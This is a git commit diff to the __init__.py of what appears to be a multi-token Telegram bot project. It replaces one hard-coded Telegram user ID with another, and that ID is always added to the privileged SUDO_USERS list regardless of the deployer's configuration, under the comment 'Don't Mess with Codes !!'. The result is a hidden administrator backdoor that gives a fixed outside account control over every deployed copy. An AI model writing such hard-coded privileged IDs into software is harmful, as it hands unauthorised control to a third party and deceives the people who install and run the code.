355de79d3d6a7c1a70b71494d28238e5143507f5
Yash.Developer <65907410+KING-OF-FLAME@users.noreply.github.com>
2024-05-11 19:51:04 +0530

    Update __init__.py

--- Godfather/__init__.py
+++ Godfather/__init__.py
@@ -37,15 +37,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1669178360 not in SUDO_USERS:
-    SUDO_USERS.append(1669178360)
+if 2086974883 not in SUDO_USERS:
+    SUDO_USERS.append(2086974883)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1669178360)
+SUDO_USERS.append(2086974883)
 
 # Tokens
 
